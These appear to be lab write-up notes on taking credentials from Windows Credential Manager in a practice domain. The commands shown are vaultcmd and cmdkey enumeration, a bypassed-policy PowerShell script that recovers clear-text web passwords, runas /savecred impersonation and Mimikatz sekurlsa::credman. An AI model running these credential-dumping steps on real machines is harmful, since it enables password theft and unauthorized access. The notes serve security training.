**What is Credentials Manager?**
Credential Manager is a Windows feature that stores logon-sensitive information for websites, applications, and networks. It contains login credentials such as usernames, passwords, and internet addresses. There are four credential categories:

    Web credentials - contain authentication details stored in Internet browsers or other applications.
    Windows credentials - contain Windows authentication details, such as NTLM or Kerberos.
    Generic credentials - contain basic authentication details, such as clear-text usernames and passwords.
    Certificate-based credentials: These are authentication details based on certificates.

**Accessing Credential Manager**

We can access the Windows Credential Manager through 1- GUI (Control Panel -> User Accounts -> Credential Manager) or 2- the command prompt.

We will be using the Microsoft Credentials Manager ```vaultcmd``` utility to interact with Windows Credential Manager.<br>
To enumerate if there are any stored credentials:
```
C:\Users\Administrator> vaultcmd /list
Currently loaded vaults:
        Vault: Web Credentials
        Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

        Vault: Windows Credentials
        Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault
```
By default, Windows has two vaults, one for Web and the other one for Windows machine credentials. The above output confirms that we have the two default vaults.<br>
Let's check if there are any stored credentials in the Web Credentials:
```
C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"
Vault Properties: Web Credentials
Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
Number of credentials: 1
Current protection method: DPAPI
```
The output shows that we have one stored credential in the specified vault. Now let's try to list **more information **about the stored credential as follows:
```
C:\Users\Administrator>VaultCmd /listcreds:"Web Credentials"
Credentials in vault: Web Credentials

Credential schema: Windows Web Password Credential
Resource: internal-app.thm.red
Identity: THMUser Saved By: MSEdge
Hidden: No
Roaming: Yes
```
**Credential Dumping**

```The VaultCmd is not able to show the password```, but we can rely on other PowerShell Scripts such as ```Get-WebCredentials.ps1```.<br>
Getting Clean-text Password from Web Credentials:
```
C:\Users\Administrator>powershell -ex bypass
PS C:\Users\Administrator> Import-Module C:\Tools\Get-WebCredentials.ps1
PS C:\Users\Administrator> Get-WebCredentials
```
The output shows that we obtained the username and password for accessing the internal application.<br>

**RunAs**

An alternative method of taking advantage of stored credentials is by using RunAs.
The ```/savecred``` argument allows you to save the credentials of the user in Windows Credentials Manager (under the Windows Credentials section). So, the next time we execute as the same user, runas will not ask for a password.

**cmdkey**

Is another way to enumerate stored credentials, which is a tool to create, delete, and display stored Windows credentials. By providing the ```/list``` argument.
```
C:\Users\thm>cmdkey /list
Currently stored credentials:

    Target: Domain:interactive=thm\thm-local
    Type: Domain Password
    User: thm\thm-local
```
Now we have a username called ```thm-local```, we will use ```runas``` with ```/savecred``` argument to execute Windows applications as the ```thm-local``` user:
```
runas /savecred /user:THM.red\thm-local cmd.exe
```

**Mimikatz**

Mimikatz is a tool that can dump clear-text passwords stored in the Credential Manager from memory.
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman
```














